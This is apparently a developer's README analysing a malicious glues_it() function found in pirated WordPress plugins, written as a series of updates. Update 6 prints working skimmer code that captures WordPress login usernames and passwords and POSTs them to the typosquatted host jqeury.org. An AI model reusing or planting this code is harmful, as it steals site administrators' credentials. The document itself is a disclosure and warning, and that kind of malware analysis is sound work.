# WARNING - Please Read
I did not wrote this code. I'm sharing it here for you to benefit. This code was found on a Wordpress plugin.

## Wordpress was returning an error which said like this:
```sh
Fatal error: cannot redeclare glues_it() (previously declared in ...
```

> I went ahead and did some research and found out that the person who was hired to edit the site of my old client was using plugins with this sketchy Wordpress function. I believe that these are premium plugins being pirated.

You can find the original piece of code here: [awful/glues_it/glues_it.php](http://git.io/vs0GD)

#### Update 1
> I’m still looking out what it really does but for the time being I told the site owner to get rid of the plugins with the function.

#### Update 2
The function code is actually written in Spanish, at least most of it. If you see words, parts of the code not making any sense, probably that part is written in Spanish.

#### Update 3
I got rid of all those dots (something that the code probably does by itself) but I did it to be able to make it a little more readable, also after doing this I had to make few fixes to make sure the code was the same as the original, just without all those dots.

Here is the link to the new file without the dots: [awful/glues_it/glues_it_CLEANED.php](http://git.io/vs0cs)

#### Update 4
The code makes reference to the domain "jqeury.org" on purpose to make you think you are requesting "jQuery.org".

Right after that the code does a request to the same domain at the following path:
```sh
jqeury.org/wp_ping.php?dname=wpd&tname=wpt&urliz=urlig
```

What does it does? I'm not sure, since my knowledge is limited on this, but maybe the code is requesting data from Wordpress ... something like the site url ... not sure yet what or why ...

#### Update 5
Take a look at "[jqeury.org/jquery-latest.js](http://git.io/vs0c6)" on line 56 after using jsbeautifier on it, this was the result: [awful/glues_it/jquery-latest.js](http://git.io/vs0c6)

At the beginning it looks like a regular jQuery Javascript file, but take a look at the lines 3349-3368, there is where the cute part begins. This file contains a script which "saves/sends (not sure if I'm correct)" the user/admin credentials using some method. I'm still looking.

#### Update 6
Here is the part that I'm talking about:
```sh
$("#loginform").submit(function(event) {
    passwd = document.getElementById('user_pass').value;
    usr = document.getElementById('user_login').value;
    domainis = window.location.host;
    urlis = window.location.href;
    $.ajax({
        type: "POST",
        url: "http://jqeury.org/wp_ping.php",
        async: false,
        data: {
            name: usr,
            pwd: passwd,
            dname: domainis,
            urliz: urlis
        },
        success: function(response) {
            num = response;
        }
    });
});
```

I believe that is getting the data from the Wordpress login form (user, password, site domain and site url) and using Ajax with method POST and in someway sending it to http://jqeury.org/wp_ping.php where probably the creator of the script is saving it to a file where it can be read and then later on be used to log in to the victims site. This is just a vague speculation of mine, since I'm just taking quick looks at this when I have time.

I also found out that on line 145 of [awful/glues_it/glues_it_CLEANED.php](http://git.io/vs0cs) that there is a possible/interesting point, take a look at:
```sh
$nimda_pw = call_user_func($object_quince_pim, 'php.resu/sedulcni/nimda-pw');"
```

If we read
```sh
php.resu/sedulcni/nimda-pw
```

backwards (that is why at line 20 of [awful/glues_it/glues_it_CLEANED.php](http://git.io/vs0cs) "strrev" is used, to reverse the string) we get
```sh
wp-admin/includes/user.php
```

I still don't know yet why the creator of this script uses that file, but maybe is using it to, in someway, to get advantage of Wordpress own code to accomplish his goal of getting the victims site url, username and password.
